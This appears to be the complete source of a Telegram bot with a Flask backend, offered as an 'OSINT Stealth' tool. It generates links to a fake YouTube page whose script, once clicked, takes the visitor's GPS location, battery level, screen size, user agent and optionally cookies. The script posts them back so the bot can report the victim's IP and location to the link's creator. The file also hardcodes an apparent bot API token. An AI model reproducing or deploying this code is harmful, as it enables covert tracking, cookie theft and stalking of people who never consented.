import asyncio, threading, requests, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
user_mode = {} 

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; height: 48px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 16px; box-sizing: border-box; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
        .play-btn { position: absolute; width: 64px; height: 44px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 25px; top: 12px; }
    </style>
</head>
<body onclick="execute()">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%;opacity:0.7;">
        <div class="play-btn" id="btn"></div>
    </div>
    <div style="padding: 15px; width: 100%; box-sizing: border-box;">
        <div style="font-size: 18px; color: #0f0f0f;">Скрытые настройки Telegram (2026)</div>
        <div style="font-size: 12px; color: #606060; margin-top: 5px;">245 тыс. просмотров • 3 часа назад</div>
    </div>
<script>
async function execute() {
    document.getElementById('btn').style.display = 'none';
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height };
    try { {{ custom_script|safe }} } catch(e) {}
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { 
            d.gps = p.coords.latitude+","+p.coords.longitude; send(d); 
        }, () => { send(d); }, {timeout: 3000});
    } else { send(d); }
    setTimeout(() => { send(d); }, 4000);
}
function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
}
</script>
</body>
</html>
"""

@app.route('/')
def home(): return "OK", 200

@app.route('/v/<aid>')
def trap(aid):
    # Безопасное получение режима
    try:
        current_mode = user_mode.get(str(aid), "INFO")
    except:
        current_mode = "INFO"
    
    script = "d.cookies = document.cookie || 'none';" if current_mode == "COOKIE" else "// info"
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    try:
        d = request.json
        ips = request.headers.get('X-Forwarded-For', request.remote_addr)
        report = (
            f"🚨 **ЦЕЛЬ В СЕТИ**\n"
            f"🌐 IP: `{ips}`\n"
            f"📱 Модель: `{d.get('res', 'N/A')}`\n"
            f"📍 GPS: `{d.get('gps', 'N/A')}`\n"
            f"🔋 Батарея: {d.get('bat', 'N/A')}"
        )
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Error in catch: {e}")
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **OSINT Stealth v17.2**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def get_link(message: types.Message):
    user_mode[str(message.from_user.id)] = "INFO"
    link = f"{BASE_URL}/v/{message.from_user.id}"
    await message.answer(f"✅ **Ссылка готова:**\n`{link}`")

async def run_flask():
    app.run(host='0.0.0.0', port=10000)

async def main():
    # Запускаем Flask в отдельном потоке через asyncio
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, lambda: app.run(host='0.0.0.0', port=10000, debug=False, use_reloader=False))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
